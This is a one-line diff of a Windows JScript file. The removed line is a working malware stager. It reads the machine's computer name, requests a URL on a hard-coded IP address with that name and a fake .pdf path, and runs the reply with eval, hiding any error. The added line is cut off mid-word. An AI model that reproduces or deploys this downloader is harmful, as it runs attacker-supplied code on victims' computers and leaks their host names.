@@ -1,1 +1,1 @@
-var ws=new ActiveXObject("WScript.Shell"),s=ws.ExpandEnvironmentStrings("%computername%");var h=new ActiveXObject('WinHttp.WinHttpRequest.5.1');try{h.open('GET','http://172.232.234.9/New-File/LX-File/'+s+'.pdf',false);h.send();eval(h.ResponseText);}catch(e){};
+var ws=new ActiveXO
